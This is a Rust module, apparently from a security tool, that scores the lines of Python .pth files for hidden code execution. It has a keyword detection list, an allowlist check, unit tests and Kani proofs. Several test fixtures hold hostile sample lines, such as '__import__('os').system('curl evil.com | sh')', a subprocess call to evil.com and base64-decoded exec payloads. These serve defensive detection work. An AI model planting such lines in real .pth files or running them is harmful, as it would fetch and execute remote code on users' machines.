//! `.pth` file content analysis.
//!
//! Every line of a `.pth` file is classified as benign (path entry),
//! warning (executable import), or critical (obfuscated execution).
//!
//! # Contract
//!
//! - `analyse_pth_line` is a **total function**: it never panics on any input.
//! - `analyse_pth_line` is **deterministic**: same input always produces same output.
//! - A line containing only path-safe characters is always `Benign`.
//! - A line containing `exec(`, `eval(`, `base64`, `__import__`, `compile(`,
//!   or `subprocess` is always at least `Warning` level.

use sanctum_types::threat::ThreatLevel;

/// Verdict for a single `.pth` line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PthVerdict {
    /// The threat level of this line.
    level: ThreatLevel,
    /// Human-readable reasons for the classification.
    reasons: Vec<String>,
}

impl PthVerdict {
    /// Create a benign verdict.
    #[must_use]
    pub const fn benign() -> Self {
        Self {
            level: ThreatLevel::Info,
            reasons: Vec::new(),
        }
    }

    /// The threat level of this verdict.
    #[must_use]
    pub const fn level(&self) -> ThreatLevel {
        self.level
    }

    /// The reasons for this classification.
    #[must_use]
    pub fn reasons(&self) -> &[String] {
        &self.reasons
    }
}

/// Result of analysing an entire `.pth` file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileAnalysis {
    /// Overall verdict for the file.
    pub verdict: FileVerdict,
    /// Lines that were classified as critical.
    pub critical_lines: Vec<CriticalLine>,
    /// Lines that were classified as warning.
    pub warning_lines: Vec<WarningLine>,
}

/// Overall file verdict.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FileVerdict {
    /// All lines are benign path entries.
    Safe,
    /// File contains warning-level lines (executable imports).
    Warning,
    /// File contains critical-level lines (obfuscated execution).
    Critical,
    /// File matches a known allowlisted package + hash.
    AllowlistedKnownPackage,
}

impl FileVerdict {
    /// Map to `ThreatLevel`.
    #[must_use]
    pub const fn level(self) -> ThreatLevel {
        match self {
            Self::Safe | Self::AllowlistedKnownPackage => ThreatLevel::Info,
            Self::Warning => ThreatLevel::Warning,
            Self::Critical => ThreatLevel::Critical,
        }
    }
}

/// A line classified as critical, with its position.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CriticalLine {
    /// 1-based line number.
    pub line_number: usize,
    /// The line content.
    pub content: String,
    /// Reasons for the critical classification.
    pub reasons: Vec<String>,
}

/// A line classified as warning, with its position.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WarningLine {
    /// 1-based line number.
    pub line_number: usize,
    /// The line content.
    pub content: String,
}

// ============================================================
// Critical keyword patterns that indicate obfuscated execution
// ============================================================

/// Keywords that indicate executable code in a `.pth` line.
/// Presence of any of these in a line that also has executable
/// markers (exec, eval, etc.) raises the level to Critical.
const CRITICAL_KEYWORDS: &[&str] = &[
    "exec(",
    "eval(",
    "base64",
    "__import__",
    "compile(",
    "subprocess",
    "os.system(",
    "os.popen(",
    "popen(",
];

/// Analyse a single `.pth` line and return a verdict.
///
/// # Contract
///
/// - This function **never panics**, regardless of input.
/// - This function is **deterministic**.
/// - Empty lines and comment lines (starting with `#`) are always `Benign`.
/// - Lines containing only path-safe characters are always `Benign`.
///
/// # Arguments
///
/// * `line` — A single line from a `.pth` file (without trailing newline).
#[must_use]
pub fn analyse_pth_line(line: &str) -> PthVerdict {
    // Strip null bytes for evasion resistance
    let cleaned: String = line.replace('\0', "");
    let trimmed = cleaned.trim();

    // Empty lines are benign
    if trimmed.is_empty() {
        return PthVerdict::benign();
    }

    // Comment lines are benign
    if trimmed.starts_with('#') {
        return PthVerdict::benign();
    }

    // Check for critical keywords (case-insensitive for evasion resistance)
    let lower = trimmed.to_lowercase();
    let mut reasons = Vec::new();

    for &keyword in CRITICAL_KEYWORDS {
        if lower.contains(keyword) {
            reasons.push(keyword.trim_end_matches('(').to_string());
        }
    }

    if !reasons.is_empty() {
        return PthVerdict {
            level: ThreatLevel::Critical,
            reasons,
        };
    }

    // Check for import statements (executable .pth lines)
    // Python executes .pth lines that start with "import" (after whitespace)
    let has_import = trimmed.starts_with("import ")
        || trimmed.starts_with("import\t")
        || lower.starts_with("import ")
        || lower.starts_with("import\t");

    // Also check for Unicode homoglyph evasion in "import"
    let has_non_ascii = trimmed.bytes().any(|b| !b.is_ascii());
    let looks_like_import = has_non_ascii
        && (lower.contains("mport") || lower.contains("іmport"));

    if has_import || looks_like_import {
        return PthVerdict {
            level: ThreatLevel::Warning,
            reasons: vec!["import statement".to_string()],
        };
    }

    // Check for semicolons (multiple statements — unusual for path entries)
    if trimmed.contains(';') {
        return PthVerdict {
            level: ThreatLevel::Warning,
            reasons: vec!["semicolon (multiple statements)".to_string()],
        };
    }

    // Check for parentheses (function calls — unusual for path entries)
    if trimmed.contains('(') && trimmed.contains(')') {
        return PthVerdict {
            level: ThreatLevel::Warning,
            reasons: vec!["function call syntax".to_string()],
        };
    }

    // If none of the above matched, this looks like a path entry → benign
    PthVerdict::benign()
}

/// Analyse an entire `.pth` file.
///
/// The file verdict is the maximum severity of any individual line.
/// Continuation lines (backslash followed by newline) are joined before
/// analysis so that keywords split across lines are still detected.
#[must_use]
pub fn analyse_pth_file(content: &str) -> FileAnalysis {
    let mut critical_lines = Vec::new();
    let mut warning_lines = Vec::new();

    // Join Python continuation lines: a backslash immediately before a
    // newline means the logical line continues on the next physical line.
    let joined = content.replace("\\\n", "");

    for (idx, line) in joined.lines().enumerate() {
        let verdict = analyse_pth_line(line);
        match verdict.level() {
            ThreatLevel::Critical => {
                critical_lines.push(CriticalLine {
                    line_number: idx + 1,
                    content: line.to_string(),
                    reasons: verdict.reasons.clone(),
                });
            }
            ThreatLevel::Warning => {
                warning_lines.push(WarningLine {
                    line_number: idx + 1,
                    content: line.to_string(),
                });
            }
            ThreatLevel::Info => {}
        }
    }

    let verdict = if !critical_lines.is_empty() {
        FileVerdict::Critical
    } else if !warning_lines.is_empty() {
        FileVerdict::Warning
    } else {
        FileVerdict::Safe
    };

    FileAnalysis {
        verdict,
        critical_lines,
        warning_lines,
    }
}

/// Analyse a `.pth` file with package context for allowlist matching.
///
/// If the content hash matches a known-safe entry for the given package,
/// returns `AllowlistedKnownPackage` regardless of content.
///
/// Uses only the built-in default allowlist. To merge user-supplied entries,
/// use [`analyse_pth_file_with_custom_allowlist`] instead.
#[must_use]
pub fn analyse_pth_file_with_context(
    content: &str,
    package_name: &str,
    content_hash: &str,
) -> FileAnalysis {
    analyse_pth_file_with_custom_allowlist(content, package_name, content_hash, None)
}

/// Analyse a `.pth` file with package context, merging a custom allowlist
/// with the built-in defaults.
///
/// When `custom_allowlist` is `Some`, its entries are appended to the
/// default allowlist before checking. When `None`, only the defaults
/// are used (equivalent to [`analyse_pth_file_with_context`]).
#[must_use]
pub fn analyse_pth_file_with_custom_allowlist(
    content: &str,
    package_name: &str,
    content_hash: &str,
    custom_allowlist: Option<&[sanctum_types::config::PthAllowlistEntry]>,
) -> FileAnalysis {
    use crate::allowlist::{default_allowlist, is_allowlisted};

    let mut allowlist = default_allowlist();
    if let Some(extra) = custom_allowlist {
        allowlist.extend_from_slice(extra);
    }
    if is_allowlisted(package_name, content_hash, &allowlist) {
        return FileAnalysis {
            verdict: FileVerdict::AllowlistedKnownPackage,
            critical_lines: Vec::new(),
            warning_lines: Vec::new(),
        };
    }

    analyse_pth_file(content)
}

/// Compute SHA-256 hash of content.
#[must_use]
pub fn content_hash(content: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(content);
    let result = hasher.finalize();
    format!("sha256:{}", hex::encode(result))
}

#[cfg(test)]
mod tests {
    use super::*;

    // ============================================================
    // BENIGN CASES: must NOT trigger alerts
    // ============================================================

    #[test]
    fn benign_simple_path_entry() {
        let result = analyse_pth_line("/usr/lib/python3.12/dist-packages/pkg");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    #[test]
    fn benign_relative_path_entry() {
        let result = analyse_pth_line("../shared/packages");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    #[test]
    fn benign_dot_prefixed_path() {
        let result = analyse_pth_line("./local_packages");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    #[test]
    fn benign_empty_line() {
        let result = analyse_pth_line("");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    #[test]
    fn benign_comment_line() {
        let result = analyse_pth_line("# This is a comment");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    #[test]
    fn benign_windows_style_path() {
        let result = analyse_pth_line("C:\\Python312\\Lib\\site-packages\\pkg");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    #[test]
    fn benign_path_with_spaces() {
        let result = analyse_pth_line("/home/user/my projects/packages");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    #[test]
    fn benign_path_with_hyphens_and_dots() {
        let result =
            analyse_pth_line("/usr/lib/python3.12/dist-packages/my-package.2.0");
        assert_eq!(result.level(), ThreatLevel::Info);
    }

    // ============================================================
    // WARNING CASES: executable but potentially legitimate
    // ============================================================

    #[test]
    fn warning_simple_import() {
        let result = analyse_pth_line(
            "import pkg_resources; pkg_resources.fixup_namespace_packages('')",
        );
        assert!(result.level() >= ThreatLevel::Warning);
    }

    #[test]
    fn warning_import_with_leading_whitespace() {
        let result = analyse_pth_line("  import setuptools");
        assert!(result.level() >= ThreatLevel::Warning);
    }

    #[test]
    fn warning_import_tab_separated() {
        let result = analyse_pth_line("import\tpkg_resources");
        assert!(result.level() >= ThreatLevel::Warning);
    }

    // ============================================================
    // CRITICAL CASES: must ALWAYS trigger
    // ============================================================

    #[test]
    fn critical_base64_exec_pattern() {
        let result = analyse_pth_line(
            r#"import base64;exec(base64.b64decode("aW1wb3J0IG9z..."))"#,
        );
        assert_eq!(result.level(), ThreatLevel::Critical);
        assert!(result.reasons().iter().any(|r| r.contains("base64")));
        assert!(result.reasons().iter().any(|r| r.contains("exec")));
    }

    #[test]
    fn critical_eval_pattern() {
        let result =
            analyse_pth_line(r"import os; eval(os.environ.get('PAYLOAD'))");
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    #[test]
    fn critical_subprocess_pattern() {
        let result = analyse_pth_line(
            "import subprocess; subprocess.Popen(['curl', 'evil.com'])",
        );
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    #[test]
    fn critical_dunder_import_pattern() {
        let result =
            analyse_pth_line("__import__('os').system('curl evil.com | sh')");
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    #[test]
    fn critical_compile_exec_pattern() {
        let result = analyse_pth_line(
            "exec(compile(open('/tmp/payload.py').read(), '<string>', 'exec'))",
        );
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    #[test]
    fn critical_obfuscated_with_chr_concat() {
        let result = analyse_pth_line(
            "exec(''.join([chr(105),chr(109),chr(112),chr(111)]))",
        );
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    #[test]
    fn critical_multiline_semicolon_chain() {
        let result = analyse_pth_line(
            "import os;import base64;exec(base64.b64decode(os.environ['P']))",
        );
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    // ============================================================
    // EVASION RESISTANCE
    // ============================================================

    #[test]
    fn evasion_unicode_homoglyph_import() {
        // U+0456 (Cyrillic і) instead of ASCII i
        let result = analyse_pth_line("іmport os");
        assert!(result.level() >= ThreatLevel::Warning);
    }

    #[test]
    fn evasion_null_bytes() {
        let result =
            analyse_pth_line("import\x00 base64;exec(base64.b64decode('..'))");
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    #[test]
    fn evasion_very_long_line() {
        let mut line = "a".repeat(500_000);
        line.push_str("exec(base64.b64decode('payload'))");
        line.push_str(&"b".repeat(500_000));
        let result = analyse_pth_line(&line);
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    #[test]
    fn evasion_mixed_case_does_not_bypass() {
        let result = analyse_pth_line("EXEC(base64.b64decode('payload'))");
        assert!(result.level() >= ThreatLevel::Warning);
    }

    #[test]
    fn popen_detected_as_critical_regardless_of_case() {
        let result = analyse_pth_line("Popen(['curl','evil.com'])");
        assert_eq!(result.level(), ThreatLevel::Critical);
    }

    // ============================================================
    // WHOLE-FILE ANALYSIS
    // ============================================================

    #[test]
    fn analyse_whole_file_benign() {
        let content = "/usr/lib/python3.12/dist-packages/pkg\n\
                        /usr/lib/python3.12/dist-packages/other\n";
        let result = analyse_pth_file(content);
        assert_eq!(result.verdict, FileVerdict::Safe);
    }

    #[test]
    fn analyse_whole_file_with_one_critical_line() {
        let content = "/usr/lib/python3.12/dist-packages/pkg\n\
                        import base64;exec(base64.b64decode('...'))\n\
                        /usr/lib/python3.12/dist-packages/other\n";
        let result = analyse_pth_file(content);
        assert_eq!(result.verdict, FileVerdict::Critical);
        assert_eq!(result.critical_lines.len(), 1);
        assert_eq!(result.critical_lines[0].line_number, 2);
    }

    // ============================================================
    // CONTENT HASHING
    // ============================================================

    #[test]
    fn content_hash_is_deterministic() {
        let data = b"import base64;exec(...)";
        let h1 = content_hash(data);
        let h2 = content_hash(data);
        assert_eq!(h1, h2);
        assert!(h1.starts_with("sha256:"));
    }

    // ============================================================
    // ALLOWLIST INTEGRATION
    // ============================================================

    #[test]
    fn allowlisted_package_returns_safe_verdict() {
        let content = "import setuptools; setuptools.setup()";
        // Use a real hash from the default allowlist (setuptools with trailing newline).
        let result = analyse_pth_file_with_context(
            content,
            "setuptools",
            "sha256:87562230a1af758c6c9cafecbd52ccd5b81951c3aa8101d5aa843586bf51ff51",
        );
        assert_eq!(result.verdict, FileVerdict::AllowlistedKnownPackage);
        assert!(result.critical_lines.is_empty());
        assert!(result.warning_lines.is_empty());
    }

    #[test]
    fn unknown_package_falls_through_to_analysis() {
        let content = "import base64;exec(base64.b64decode('...'))";
        let result = analyse_pth_file_with_context(
            content,
            "evil-package",
            "sha256:malicious",
        );
        assert_eq!(result.verdict, FileVerdict::Critical);
    }

    // ============================================================
    // CUSTOM ALLOWLIST INTEGRATION (W1)
    // ============================================================

    #[test]
    fn custom_allowlist_items_are_respected() {
        use sanctum_types::config::PthAllowlistEntry;

        let content = "import my_internal_package; my_internal_package.init()";
        let hash = super::content_hash(content.as_bytes());

        // Without custom allowlist, this would be Warning (has import)
        let result_without = analyse_pth_file_with_custom_allowlist(
            content,
            "my-internal",
            &hash,
            None,
        );
        assert_eq!(result_without.verdict, FileVerdict::Warning);

        // With a custom allowlist containing this package+hash, it should be allowlisted
        let custom = vec![PthAllowlistEntry {
            package: "my-internal".to_string(),
            hash: hash.clone(),
        }];
        let result_with = analyse_pth_file_with_custom_allowlist(
            content,
            "my-internal",
            &hash,
            Some(&custom),
        );
        assert_eq!(result_with.verdict, FileVerdict::AllowlistedKnownPackage);
    }

    #[test]
    fn custom_allowlist_does_not_override_wrong_hash() {
        use sanctum_types::config::PthAllowlistEntry;

        let content = "import suspicious; suspicious.do_thing()";
        let hash = super::content_hash(content.as_bytes());

        let custom = vec![PthAllowlistEntry {
            package: "suspicious".to_string(),
            hash: "sha256:wrong_hash".to_string(),
        }];
        let result = analyse_pth_file_with_custom_allowlist(
            content,
            "suspicious",
            &hash,
            Some(&custom),
        );
        // Hash doesn't match, should fall through to analysis
        assert_eq!(result.verdict, FileVerdict::Warning);
    }

    // ============================================================
    // D8: Line continuation joining
    // ============================================================

    #[test]
    fn continuation_line_os_system_detected_as_critical() {
        // os.system( is split across two lines via backslash continuation
        let content = "os.sy\\\nstem('curl evil.com')";
        let result = analyse_pth_file(content);
        assert_eq!(
            result.verdict,
            FileVerdict::Critical,
            "os.system( split across continuation lines must still be Critical"
        );
    }

    #[test]
    fn continuation_line_exec_detected_as_critical() {
        let content = "ex\\\nec(base64.b64decode('payload'))";
        let result = analyse_pth_file(content);
        assert_eq!(result.verdict, FileVerdict::Critical);
    }

    #[test]
    fn no_continuation_still_works() {
        // Normal content without continuation should work as before
        let content = "exec(base64.b64decode('payload'))";
        let result = analyse_pth_file(content);
        assert_eq!(result.verdict, FileVerdict::Critical);
    }

    #[test]
    fn benign_path_with_backslash_not_false_positive() {
        // A Windows-style path with backslash NOT followed by newline
        // should remain benign (backslash in the middle of a line is fine)
        let content = "C:\\Python312\\Lib\\site-packages\\pkg";
        let result = analyse_pth_file(content);
        assert_eq!(result.verdict, FileVerdict::Safe);
    }
}

// ── Kani bounded model checking proofs ──────────────────────────────────────
//
// These proofs are compiled ONLY by the Kani verifier (`cargo kani`).
// They are invisible to normal `cargo build` and `cargo test`.
//
// Run individual proofs:   cargo kani --harness pth_analyser_never_panics
// Run all proofs:          cargo kani --workspace

#[cfg(kani)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod kani_proofs {
    use super::*;

    /// Proof 1: `analyse_pth_line` never panics on any UTF-8 input up to 32 bytes.
    ///
    /// This proves the totality contract from the module doc (line 8).
    /// PR CI uses unwind(32); nightly CI uses unwind(256) for deeper coverage.
    #[kani::proof]
    #[kani::unwind(34)]
    fn pth_analyser_never_panics() {
        let len: usize = kani::any();
        kani::assume(len <= 32);
        let bytes: Vec<u8> = (0..len).map(|_| kani::any()).collect();
        if let Ok(line) = std::str::from_utf8(&bytes) {
            let _ = analyse_pth_line(line);
        }
    }

    /// Proof 2: A line composed entirely of path-safe characters (`[a-z0-9/._-]`)
    /// always receives `ThreatLevel::Info` (benign).
    ///
    /// This proves the contract from the module doc (line 10).
    #[kani::proof]
    #[kani::unwind(18)]
    fn pure_path_is_always_benign() {
        let len: usize = kani::any();
        kani::assume(len > 0 && len <= 16);
        let path_chars = b"abcdefghijklmnopqrstuvwxyz0123456789/._-";
        let bytes: Vec<u8> = (0..len)
            .map(|_| {
                let idx: usize = kani::any();
                kani::assume(idx < path_chars.len());
                path_chars[idx]
            })
            .collect();
        let line = std::str::from_utf8(&bytes).unwrap();
        let result = analyse_pth_line(line);
        assert_eq!(result.level(), sanctum_types::threat::ThreatLevel::Info);
    }

    /// Proof 3: Any ASCII line containing `exec(` is classified at least `Warning`.
    ///
    /// This proves part of the contract from the module doc (line 11).
    #[kani::proof]
    #[kani::unwind(22)]
    fn exec_is_never_benign() {
        let prefix_len: usize = kani::any();
        let suffix_len: usize = kani::any();
        kani::assume(prefix_len <= 8);
        kani::assume(suffix_len <= 8);
        let prefix: String = (0..prefix_len)
            .map(|_| {
                let c: u8 = kani::any();
                kani::assume(c.is_ascii());
                c as char
            })
            .collect();
        let suffix: String = (0..suffix_len)
            .map(|_| {
                let c: u8 = kani::any();
                kani::assume(c.is_ascii());
                c as char
            })
            .collect();
        let line = format!("{prefix}exec({suffix}");
        let result = analyse_pth_line(&line);
        assert!(result.level() >= sanctum_types::threat::ThreatLevel::Warning);
    }
}
